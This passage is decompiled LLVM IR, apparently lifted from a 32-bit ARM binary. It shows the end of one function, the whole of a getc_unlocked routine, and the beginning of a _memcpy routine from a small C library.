  %v0_13af0 = load i32, i32* %r3.global-to-local, align 4
  %v1_13af0 = load i32, i32* @r7, align 4
  %v2_13af0 = add i32 %v1_13af0, 64
  %v3_13af0 = inttoptr i32 %v2_13af0 to i32*
  store i32 %v0_13af0, i32* %v3_13af0, align 4
  %v0_13af4 = load i32, i32* @r7, align 4
  %v1_13af4 = add i32 %v0_13af4, 56
  store i32 %v1_13af4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13af8

dec_label_pc_13af8:                               ; preds = %dec_label_pc_13b28.dec_label_pc_13af8_crit_edge, %dec_label_pc_13af0
  %v0_13b00 = phi i32 [ %v0_13b00.pre, %dec_label_pc_13b28.dec_label_pc_13af8_crit_edge ], [ %v1_13af4, %dec_label_pc_13af0 ]
  %v0_13af8 = phi i32 [ %v0_13af8.pre, %dec_label_pc_13b28.dec_label_pc_13af8_crit_edge ], [ %v0_13af4, %dec_label_pc_13af0 ]
  %v1_13af8 = add i32 %v0_13af8, 56
  %v2_13af8 = inttoptr i32 %v1_13af8 to i32*
  %v3_13af8 = load i32, i32* %v2_13af8, align 4
  store i32 %v3_13af8, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_13b00, i32* %r2.global-to-local, align 4
  %v1_13b0422 = inttoptr i32 %v0_13b00 to i32*
  %v2_13b0423 = load i32, i32* %v1_13b0422, align 4
  store i32 %v2_13b0423, i32* %r3.global-to-local, align 4
  %v3_13b0825 = icmp uge i32 %v2_13b0423, %v3_13af8
  store i1 %v3_13b0825, i1* %cpsr_c.global-to-local, align 1
  %v9_13b0831 = icmp eq i32 %v2_13b0423, %v3_13af8
  br i1 %v9_13b0831, label %dec_label_pc_13b10, label %dec_label_pc_13b28

dec_label_pc_13b10:                               ; preds = %dec_label_pc_13af8, %dec_label_pc_13b10.dec_label_pc_13b04_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13b20 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13b20, label %dec_label_pc_13b24, label %dec_label_pc_13b10.dec_label_pc_13b04_crit_edge

dec_label_pc_13b10.dec_label_pc_13b04_crit_edge:  ; preds = %dec_label_pc_13b10
  %v0_13b04.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13b08.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13b04 = inttoptr i32 %v0_13b04.pre to i32*
  %v2_13b04 = load i32, i32* %v1_13b04, align 4
  store i32 %v2_13b04, i32* %r3.global-to-local, align 4
  %v3_13b08 = icmp uge i32 %v2_13b04, %v1_13b08.pre
  store i1 %v3_13b08, i1* %cpsr_c.global-to-local, align 1
  %v9_13b08 = icmp eq i32 %v2_13b04, %v1_13b08.pre
  br i1 %v9_13b08, label %dec_label_pc_13b10, label %dec_label_pc_13b28

dec_label_pc_13b24:                               ; preds = %dec_label_pc_13b10
  %v0_13b24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13b24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13b28

dec_label_pc_13b28:                               ; preds = %dec_label_pc_13af8, %dec_label_pc_13b10.dec_label_pc_13b04_crit_edge, %dec_label_pc_13b24
  %v0_13b30 = phi i32 [ %v0_13b24, %dec_label_pc_13b24 ], [ %v2_13b0423, %dec_label_pc_13af8 ], [ %v2_13b04, %dec_label_pc_13b10.dec_label_pc_13b04_crit_edge ]
  %v1_13b28 = phi i32 [ %v0_13b24, %dec_label_pc_13b24 ], [ %v3_13af8, %dec_label_pc_13af8 ], [ %v1_13b08.pre, %dec_label_pc_13b10.dec_label_pc_13b04_crit_edge ]
  %v3_13b28 = icmp uge i32 %v0_13b30, %v1_13b28
  store i1 %v3_13b28, i1* %cpsr_c.global-to-local, align 1
  %v9_13b28 = icmp eq i32 %v0_13b30, %v1_13b28
  br i1 %v9_13b28, label %dec_label_pc_13b30, label %dec_label_pc_13b28.dec_label_pc_13af8_crit_edge

dec_label_pc_13b28.dec_label_pc_13af8_crit_edge:  ; preds = %dec_label_pc_13b28
  %v0_13af8.pre = load i32, i32* @r7, align 4
  %v0_13b00.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13af8

dec_label_pc_13b30:                               ; preds = %dec_label_pc_13b28
  %v2_13b30 = icmp ne i32 %v1_13b28, 0
  store i1 %v2_13b30, i1* %cpsr_c.global-to-local, align 1
  %v7_13b34 = icmp slt i32 %v1_13b28, 2
  br i1 %v7_13b34, label %dec_label_pc_13b50, label %dec_label_pc_13b38

dec_label_pc_13b38:                               ; preds = %dec_label_pc_13b30
  %v0_13b3c = load i32, i32* @r1, align 4
  %v1_13b3c = add i32 %v0_13b3c, 129
  store i32 %v1_13b3c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13b50:                               ; preds = %.thread, %dec_label_pc_13adc, %dec_label_pc_13b38, %dec_label_pc_13b30, %dec_label_pc_13a4c
  %v0_13b50 = load i32, i32* %r5.global-to-local, align 4
  %v2_13b58 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13b58, i32* @r4, align 4
  store i32 %v6_13a1c, i32* @r5, align 4
  store i32 %v9_13a1c, i32* @r6, align 4
  store i32 %v12_13a1c, i32* @r7, align 4
  store i32 %v15_13a1c, i32* @lr, align 4
  ret i32 %v0_13b50

; uselistorder directives
  uselistorder i32 %v0_13b24, { 1, 0, 2 }
  uselistorder i32 %v1_13b08.pre, { 0, 2, 1 }
  uselistorder i32 %v0_13ac0, { 1, 0, 2 }
  uselistorder i32 %v1_13abc, { 0, 2, 1 }
  uselistorder i32 %v1_13a7c, { 1, 0 }
  uselistorder i32 %v3_13a34, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_13b50, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_13b28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13b10, { 1, 0 }
  uselistorder label %dec_label_pc_13adc, { 1, 0 }
  uselistorder label %dec_label_pc_13aac, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_13a9c, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_13b60 = load i32, i32* @r4, align 4
  store i32 %v3_13b60, i32* %stack_var_-12, align 4
  %v6_13b60 = load i32, i32* @r5, align 4
  %v9_13b60 = load i32, i32* @lr, align 4
  %v0_13b64 = load i32, i32* @r0, align 4
  %v1_13b64 = add i32 %v0_13b64, 16
  %v2_13b64 = inttoptr i32 %v1_13b64 to i32*
  %v3_13b64 = load i32, i32* %v2_13b64, align 4
  store i32 %v3_13b64, i32* %r2.global-to-local, align 4
  %v1_13b68 = add i32 %v0_13b64, 24
  %v2_13b68 = inttoptr i32 %v1_13b68 to i32*
  %v3_13b68 = load i32, i32* %v2_13b68, align 4
  %v3_13b6c = icmp ult i32 %v3_13b64, %v3_13b68
  store i32 %v0_13b64, i32* @r4, align 4
  br i1 %v3_13b6c, label %bb, label %dec_label_pc_13b8c

bb:                                               ; preds = %entry
  %v2_13b78 = inttoptr i32 %v3_13b64 to i8*
  %v3_13b78 = load i8, i8* %v2_13b78, align 1
  %v4_13b78 = zext i8 %v3_13b78 to i32
  store i32 %v4_13b78, i32* %r0.global-to-local, align 4
  %v6_13b78 = add i32 %v3_13b64, 1
  store i32 %v6_13b78, i32* %r2.global-to-local, align 4
  store i32 %v6_13b78, i32* %v2_13b64, align 4
  br label %dec_label_pc_13c78

dec_label_pc_13b8c:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r5, align 4
  %v1_13b8c = inttoptr i32 %v0_13b64 to i16*
  %v2_13b8c = load i16, i16* %v1_13b8c, align 2
  %v3_13b8c = zext i16 %v2_13b8c to i32
  %v1_13b90 = and i32 %v3_13b8c, 131
  %tmp25 = icmp ugt i32 %v1_13b90, 128
  br i1 %tmp25, label %dec_label_pc_13bac, label %dec_label_pc_13b9c

dec_label_pc_13b9c:                               ; preds = %dec_label_pc_13b8c
  store i32 128, i32* @r1, align 4
  %v0_13ba0 = call i32 @__stdio_trans2r_o()
  store i32 %v0_13ba0, i32* %r0.global-to-local, align 4
  %v2_13ba4 = icmp eq i32 %v0_13ba0, 0
  br i1 %v2_13ba4, label %dec_label_pc_13b9c.dec_label_pc_13bac_crit_edge, label %dec_label_pc_13c74

dec_label_pc_13b9c.dec_label_pc_13bac_crit_edge:  ; preds = %dec_label_pc_13b9c
  %v0_13bac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13bac

dec_label_pc_13bac:                               ; preds = %dec_label_pc_13b9c.dec_label_pc_13bac_crit_edge, %dec_label_pc_13b8c
  %v2_13bec = phi i32 [ %v0_13bac.pre, %dec_label_pc_13b9c.dec_label_pc_13bac_crit_edge ], [ %v0_13b64, %dec_label_pc_13b8c ]
  %v1_13bac = inttoptr i32 %v2_13bec to i16*
  %v2_13bac = load i16, i16* %v1_13bac, align 2
  %v3_13bac = zext i16 %v2_13bac to i32
  store i32 %v3_13bac, i32* %r2.global-to-local, align 4
  %v1_13bb0 = and i32 %v3_13bac, 2
  %v2_13bb0 = icmp eq i32 %v1_13bb0, 0
  br i1 %v2_13bb0, label %dec_label_pc_13bdc, label %dec_label_pc_13bb8

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13bac
  %tmp26 = urem i16 %v2_13bac, 2
  %v1_13bb8 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_13bb8
  %v4_13bbc = and i32 %tmp22, 4
  %v5_13bbc = add i32 %v4_13bbc, %v2_13bec
  %v1_13bc0 = add i32 %v5_13bbc, 36
  %v2_13bc0 = inttoptr i32 %v1_13bc0 to i8*
  %v3_13bc0 = load i8, i8* %v2_13bc0, align 1
  %v4_13bc0 = zext i8 %v3_13bc0 to i32
  %v1_13bc4 = add nsw i32 %v3_13bac, -1
  store i32 %v1_13bc4, i32* %r2.global-to-local, align 4
  store i32 %v4_13bc0, i32* %r0.global-to-local, align 4
  %v2_13bd0 = add i32 %v2_13bec, 40
  %v3_13bd0 = inttoptr i32 %v2_13bd0 to i32*
  store i32 0, i32* %v3_13bd0, align 4
  %v0_13bd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13bd4 = trunc i32 %v0_13bd4 to i16
  %v2_13bd4 = load i32, i32* @r4, align 4
  %v3_13bd4 = inttoptr i32 %v2_13bd4 to i16*
  store i16 %v1_13bd4, i16* %v3_13bd4, align 2
  br label %dec_label_pc_13c78

dec_label_pc_13bdc:                               ; preds = %dec_label_pc_13bac
  %v1_13bdc = add i32 %v2_13bec, 16
  %v1_13be0 = inttoptr i32 %v1_13bdc to i32*
  %v2_13be0 = load i32, i32* %v1_13be0, align 4
  store i32 %v2_13be0, i32* @r1, align 4
  %v3_13be0 = add i32 %v2_13bec, 20
  %v4_13be0 = inttoptr i32 %v3_13be0 to i32*
  %v5_13be0 = load i32, i32* %v4_13be0, align 4
  %v9_13be4 = icmp eq i32 %v5_13be0, %v2_13be0
  br i1 %v9_13be4, label %dec_label_pc_13bf4, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13bdc
  %v2_13be8 = inttoptr i32 %v2_13be0 to i8*
  %v3_13be8 = load i8, i8* %v2_13be8, align 1
  %v4_13be8 = zext i8 %v3_13be8 to i32
  store i32 %v4_13be8, i32* %r0.global-to-local, align 4
  %v6_13be8 = add i32 %v2_13be0, 1
  store i32 %v6_13be8, i32* @r1, align 4
  store i32 %v6_13be8, i32* %v1_13be0, align 4
  br label %dec_label_pc_13c78

dec_label_pc_13bf4:                               ; preds = %dec_label_pc_13bdc
  %v1_13bf4 = add i32 %v2_13bec, 4
  %v2_13bf4 = inttoptr i32 %v1_13bf4 to i32*
  %v3_13bf4 = load i32, i32* %v2_13bf4, align 4
  %v7_13bf8 = icmp eq i32 %v3_13bf4, -2
  br i1 %v7_13bf8, label %.thread7, label %dec_label_pc_13c0c

.thread7:                                         ; preds = %dec_label_pc_13bf4
  %v2_13bfc = or i16 %v2_13bac, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_13bfc, i16* %v1_13bac, align 2
  br label %dec_label_pc_13c78

dec_label_pc_13c0c:                               ; preds = %dec_label_pc_13bf4
  %v1_13c0c = and i32 %v3_13bac, 768
  %v2_13c0c = icmp eq i32 %v1_13c0c, 0
  br i1 %v2_13c0c, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_13c0c
  %v1_13c14 = load i32, i32* @r5, align 4
  %v3_13c14 = add i32 %v1_13c14, 84
  %v4_13c14 = inttoptr i32 %v3_13c14 to i32*
  %v5_13c14 = load i32, i32* %v4_13c14, align 4
  store i32 %v5_13c14, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_13c0c, %bb23
  store i32 80924, i32* @lr, align 4
  %v1_13c18 = xor i1 %v2_13c0c, true
  call void @__pseudo_cond_branch(i1 %v1_13c18, i32 ptrtoint (i32* @global_var_d040.422 to i32))
  %v0_13c1c = load i32, i32* @r4, align 4
  %v1_13c1c = add i32 %v0_13c1c, 8
  store i32 %v1_13c1c, i32* %r2.global-to-local, align 4
  %v1_13c20 = inttoptr i32 %v1_13c1c to i32*
  %v2_13c20 = load i32, i32* %v1_13c20, align 4
  store i32 %v2_13c20, i32* %r2.global-to-local, align 4
  %v3_13c20 = add i32 %v0_13c1c, 12
  %v4_13c20 = inttoptr i32 %v3_13c20 to i32*
  %v5_13c20 = load i32, i32* %v4_13c20, align 4
  %v9_13c24 = icmp eq i32 %v5_13c20, %v2_13c20
  br i1 %v9_13c24, label %dec_label_pc_13c58, label %dec_label_pc_13c2c

dec_label_pc_13c2c:                               ; preds = %.thread9
  %v2_13c2c = add i32 %v0_13c1c, 24
  %v3_13c2c = inttoptr i32 %v2_13c2c to i32*
  store i32 %v2_13c20, i32* %v3_13c2c, align 4
  %v0_13c30 = load i32, i32* @r4, align 4
  store i32 %v0_13c30, i32* %r0.global-to-local, align 4
  %v2_13c34 = call i32 @__stdio_rfill(i32 %v0_13c30)
  store i32 %v2_13c34, i32* %r0.global-to-local, align 4
  %v2_13c38 = icmp eq i32 %v2_13c34, 0
  br i1 %v2_13c38, label %dec_label_pc_13c74, label %dec_label_pc_13c40

dec_label_pc_13c40:                               ; preds = %dec_label_pc_13c2c
  %v0_13c40 = load i32, i32* @r4, align 4
  %v1_13c40 = add i32 %v0_13c40, 20
  %v2_13c40 = inttoptr i32 %v1_13c40 to i32*
  %v3_13c40 = load i32, i32* %v2_13c40, align 4
  %v2_13c44 = add i32 %v0_13c40, 24
  %v3_13c44 = inttoptr i32 %v2_13c44 to i32*
  store i32 %v3_13c40, i32* %v3_13c44, align 4
  %v0_13c48 = load i32, i32* @r4, align 4
  %v1_13c48 = add i32 %v0_13c48, 16
  %v2_13c48 = inttoptr i32 %v1_13c48 to i32*
  %v3_13c48 = load i32, i32* %v2_13c48, align 4
  %v1_13c4c = inttoptr i32 %v3_13c48 to i8*
  %v2_13c4c = load i8, i8* %v1_13c4c, align 1
  %v3_13c4c = zext i8 %v2_13c4c to i32
  store i32 %v3_13c4c, i32* %r0.global-to-local, align 4
  %v5_13c4c = add i32 %v3_13c48, 1
  store i32 %v5_13c4c, i32* %v2_13c48, align 4
  br label %dec_label_pc_13c78

dec_label_pc_13c58:                               ; preds = %.thread9
  %v1_13c58 = inttoptr i32 %v0_13c1c to i16*
  store i32 %v0_13c1c, i32* %r0.global-to-local, align 4
  %v2_13c5c = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_13c5c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_13c64 = call i32 @__stdio_READ(i16* %v1_13c58, i32 %v2_13c5c, i32 1)
  store i32 %v5_13c64, i32* %r0.global-to-local, align 4
  %v2_13c68 = icmp eq i32 %v5_13c64, 0
  br i1 %v2_13c68, label %dec_label_pc_13c74, label %bb24

bb24:                                             ; preds = %dec_label_pc_13c58
  %v4_13c6c = load i8, i8* %stack_var_-17, align 1
  %v5_13c6c = sext i8 %v4_13c6c to i32
  store i32 %v5_13c6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c78

dec_label_pc_13c74:                               ; preds = %dec_label_pc_13c58, %dec_label_pc_13b9c, %dec_label_pc_13c2c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c78

dec_label_pc_13c78:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_13c40, %dec_label_pc_13bb8, %dec_label_pc_13c74
  %v2_13c7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13c7c, i32* @r4, align 4
  store i32 %v6_13b60, i32* @r5, align 4
  store i32 %v9_13b60, i32* @lr, align 4
  %v1_13c80 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13c80

; uselistorder directives
  uselistorder i32 %v2_13be0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_13bec, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_13b64, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder label %dec_label_pc_13c78, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_13c74, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_13c90 = load i32, i32* @r1, align 4
  %v1_13c90 = load i32, i32* %r0.global-to-local, align 4
  %v2_13c90 = sub i32 %v0_13c90, %v1_13c90
  %v3_13c90 = icmp ult i32 %v0_13c90, %v1_13c90
  %v4_13c90 = xor i32 %v1_13c90, %v0_13c90
  %v5_13c90 = xor i32 %v2_13c90, %v0_13c90
  %v6_13c90 = and i32 %v5_13c90, %v4_13c90
  %v7_13c90 = icmp slt i32 %v6_13c90, 0
  store i1 %v7_13c90, i1* %cpsr_v.global-to-local, align 1
  %v8_13c90 = icmp slt i32 %v2_13c90, 0
  store i1 %v8_13c90, i1* %cpsr_n.global-to-local, align 1
  %v9_13c90 = icmp eq i32 %v0_13c90, %v1_13c90
  store i1 %v9_13c90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13c90, label %dec_label_pc_13ee4, label %dec_label_pc_13c98

dec_label_pc_13c98:                               ; preds = %entry
  br i1 %v9_13c90, label %.thread129, label %bb

.thread129:                                       ; preds = %bb153, %.thread128, %bb150, %dec_label_pc_13c98
  %merge = phi i32 [ %v0_13c90, %dec_label_pc_13c98 ], [ %v2_13f78, %bb150 ], [ %v11_13f94, %bb153 ], [ %v7_13f94, %.thread128 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_13c98
  %v5_13c9c = inttoptr i32 %v1_13c90 to i8*
  store i8* %v5_13c9c, i8** %stack_var_-8, align 4
  %v8_13c9c = load i32, i32* @lr, align 4
  %v0_13ca0 = load i32, i32* @r2, align 4
  %v2_13ca0 = add i32 %v0_13ca0, -4
  store i32 %v2_13ca0, i32* %r2.global-to-local, align 4
  %v4_13ca0 = sub i32 3, %v0_13ca0
  %v5_13ca0 = and i32 %v4_13ca0, %v0_13ca0
  %v6_13ca0 = icmp slt i32 %v5_13ca0, 0
  store i1 %v6_13ca0, i1* %cpsr_v.global-to-local, align 1
  %v7_13ca0 = icmp slt i32 %v2_13ca0, 0
  store i1 %v7_13ca0, i1* %cpsr_n.global-to-local, align 1
  %v8_13ca0 = icmp eq i32 %v0_13ca0, 4
  store i1 %v8_13ca0, i1* %cpsr_z.global-to-local, align 1
  %v5_13ca4 = icmp slt i32 %v0_13ca0, 4
  br i1 %v5_13ca4, label %bb140, label %dec_label_pc_13ca8

dec_label_pc_13ca8:                               ; preds = %bb
  %v1_13ca8 = urem i32 %v1_13c90, 4
  store i32 %v1_13ca8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13ca8 = icmp eq i32 %v1_13ca8, 0
  store i1 %v2_13ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ca8, label %dec_label_pc_13cb0, label %dec_label_pc_13d5c

dec_label_pc_13cb0:                               ; preds = %dec_label_pc_13ca8
  %v1_13cb0 = urem i32 %v0_13c90, 4
  store i32 %v1_13cb0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13cb0 = icmp eq i32 %v1_13cb0, 0
  store i1 %v2_13cb0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_13c90 to i2
  br i1 %v2_13cb0, label %dec_label_pc_13cb8, label %dec_label_pc_13d8c

dec_label_pc_13cb8:                               ; preds = %dec_label_pc_13cb0, %dec_label_pc_13d84
  %v0_13cd093 = phi i32 [ %v1_13c90, %dec_label_pc_13cb0 ], [ %v0_13eac76, %dec_label_pc_13d84 ]
  %v0_13ccc92 = phi i32 [ %v0_13c90, %dec_label_pc_13cb0 ], [ %v0_13d84, %dec_label_pc_13d84 ]
  %v0_13cb8 = phi i32 [ %v2_13ca0, %dec_label_pc_13cb0 ], [ %v2_13d7c, %dec_label_pc_13d84 ]
  %v1_13cb8 = add i32 %v0_13cb8, -8
  store i32 %v1_13cb8, i32* %r2.global-to-local, align 4
  %v3_13cb8 = sub i32 7, %v0_13cb8
  %v4_13cb8 = and i32 %v3_13cb8, %v0_13cb8
  %v5_13cb8 = icmp slt i32 %v4_13cb8, 0
  store i1 %v5_13cb8, i1* %cpsr_v.global-to-local, align 1
  %v6_13cb8 = icmp slt i32 %v1_13cb8, 0
  store i1 %v6_13cb8, i1* %cpsr_n.global-to-local, align 1
  %v7_13cb8 = icmp eq i32 %v0_13cb8, 8
  store i1 %v7_13cb8, i1* %cpsr_z.global-to-local, align 1
  %v2_13cbc = xor i1 %v6_13cb8, %v5_13cb8
  br i1 %v2_13cbc, label %dec_label_pc_13d0c, label %dec_label_pc_13cc0

dec_label_pc_13cc0:                               ; preds = %dec_label_pc_13cb8
  %v1_13cc0 = add i32 %v0_13cb8, -28
  store i32 %v1_13cc0, i32* %r2.global-to-local, align 4
  %v3_13cc0 = sub i32 27, %v0_13cb8
  %v4_13cc0 = and i32 %v3_13cc0, %v1_13cb8
  %v5_13cc0 = icmp slt i32 %v4_13cc0, 0
  store i1 %v5_13cc0, i1* %cpsr_v.global-to-local, align 1
  %v6_13cc0 = icmp slt i32 %v1_13cc0, 0
  store i1 %v6_13cc0, i1* %cpsr_n.global-to-local, align 1
  %v7_13cc0 = icmp eq i32 %v1_13cb8, 20
  store i1 %v7_13cc0, i1* %cpsr_z.global-to-local, align 1
  %v2_13cc4 = xor i1 %v6_13cc0, %v5_13cc0
  br i1 %v2_13cc4, label %dec_label_pc_13cf8, label %dec_label_pc_13cc8

dec_label_pc_13cc8:                               ; preds = %dec_label_pc_13cc0
  %v0_13cc8 = load i32, i32* @r4, align 4
  store i32 %v0_13cc8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13ccc

dec_label_pc_13ccc:                               ; preds = %dec_label_pc_13ccc.dec_label_pc_13ccc_crit_edge, %dec_label_pc_13cc8
  %v0_13cd0 = phi i32 [ %v12_13cd8, %dec_label_pc_13ccc.dec_label_pc_13ccc_crit_edge ], [ %v0_13cd093, %dec_label_pc_13cc8 ]
  %v0_13ccc = phi i32 [ %v0_13ccc.pre, %dec_label_pc_13ccc.dec_label_pc_13ccc_crit_edge ], [ %v0_13ccc92, %dec_label_pc_13cc8 ]
  %v1_13ccc = inttoptr i32 %v0_13ccc to i32*
  %v2_13ccc = load i32, i32* %v1_13ccc, align 4
  %v3_13ccc = add i32 %v0_13ccc, 4
  %v4_13ccc = inttoptr i32 %v3_13ccc to i32*
  %v5_13ccc = load i32, i32* %v4_13ccc, align 4
  store i32 %v5_13ccc, i32* %r4.global-to-local, align 4
  %v6_13ccc = add i32 %v0_13ccc, 8
  %v7_13ccc = inttoptr i32 %v6_13ccc to i32*
  %v8_13ccc = load i32, i32* %v7_13ccc, align 4
  store i32 %v8_13ccc, i32* %ip.global-to-local, align 4
  %v9_13ccc = add i32 %v0_13ccc, 12
  %v10_13ccc = inttoptr i32 %v9_13ccc to i32*
  %v11_13ccc = load i32, i32* %v10_13ccc, align 4
  store i32 %v11_13ccc, i32* %lr.global-to-local, align 4
  %v12_13ccc = add i32 %v0_13ccc, 16
  store i32 %v12_13ccc, i32* %r1.global-to-local, align 4
  %v1_13cd0 = inttoptr i32 %v0_13cd0 to i32*
  store i32 %v2_13ccc, i32* %v1_13cd0, align 4
  %v3_13cd0 = add i32 %v0_13cd0, 4
  %v4_13cd0 = inttoptr i32 %v3_13cd0 to i32*
  %v5_13cd0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13cd0, i32* %v4_13cd0, align 4
  %v6_13cd0 = add i32 %v0_13cd0, 8
  %v7_13cd0 = inttoptr i32 %v6_13cd0 to i32*
  %v8_13cd0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_13cd0, i32* %v7_13cd0, align 4
  %v9_13cd0 = add i32 %v0_13cd0, 12
  %v10_13cd0 = inttoptr i32 %v9_13cd0 to i32*
  %v11_13cd0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_13cd0, i32* %v10_13cd0, align 4
  %v12_13cd0 = add i32 %v0_13cd0, 16
  store i32 %v12_13cd0, i32* %r0.global-to-local, align 4
  %v0_13cd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13cd4 = inttoptr i32 %v0_13cd4 to i32*
  %v2_13cd4 = load i32, i32* %v1_13cd4, align 4
  store i32 %v2_13cd4, i32* @r3, align 4
  %v3_13cd4 = add i32 %v0_13cd4, 4
  %v4_13cd4 = inttoptr i32 %v3_13cd4 to i32*
  %v5_13cd4 = load i32, i32* %v4_13cd4, align 4
  store i32 %v5_13cd4, i32* %r4.global-to-local, align 4
  %v6_13cd4 = add i32 %v0_13cd4, 8
  %v7_13cd4 = inttoptr i32 %v6_13cd4 to i32*
  %v8_13cd4 = load i32, i32* %v7_13cd4, align 4
  store i32 %v8_13cd4, i32* @ip, align 4
  %v9_13cd4 = add i32 %v0_13cd4, 12
  %v10_13cd4 = inttoptr i32 %v9_13cd4 to i32*
  %v11_13cd4 = load i32, i32* %v10_13cd4, align 4
  store i32 %v11_13cd4, i32* %lr.global-to-local, align 4
  %v12_13cd4 = add i32 %v0_13cd4, 16
  store i32 %v12_13cd4, i32* @r1, align 4
  %v1_13cd8 = inttoptr i32 %v12_13cd0 to i32*
  store i32 %v2_13cd4, i32* %v1_13cd8, align 4
  %v3_13cd8 = add i32 %v0_13cd0, 20
  %v4_13cd8 = inttoptr i32 %v3_13cd8 to i32*
  %v5_13cd8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13cd8, i32* %v4_13cd8, align 4
  %v6_13cd8 = add i32 %v0_13cd0, 24
  %v7_13cd8 = inttoptr i32 %v6_13cd8 to i32*
  %v8_13cd8 = load i32, i32* @ip, align 4
  store i32 %v8_13cd8, i32* %v7_13cd8, align 4
  %v9_13cd8 = add i32 %v0_13cd0, 28
  %v10_13cd8 = inttoptr i32 %v9_13cd8 to i32*
  %v11_13cd8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_13cd8, i32* %v10_13cd8, align 4
  %v12_13cd8 = add i32 %v0_13cd0, 32
  store i32 %v12_13cd8, i32* %r0.global-to-local, align 4
  %v0_13cdc = load i32, i32* %r2.global-to-local, align 4
  %v1_13cdc = add i32 %v0_13cdc, -32
  store i32 %v1_13cdc, i32* %r2.global-to-local, align 4
  %v3_13cdc = sub i32 31, %v0_13cdc
  %v4_13cdc = and i32 %v3_13cdc, %v0_13cdc
  %v5_13cdc = icmp slt i32 %v4_13cdc, 0
  %v6_13cdc = icmp slt i32 %v1_13cdc, 0
  %v2_13ce0 = xor i1 %v6_13cdc, %v5_13cdc
  br i1 %v2_13ce0, label %dec_label_pc_13ce4, label %dec_label_pc_13ccc.dec_label_pc_13ccc_crit_edge

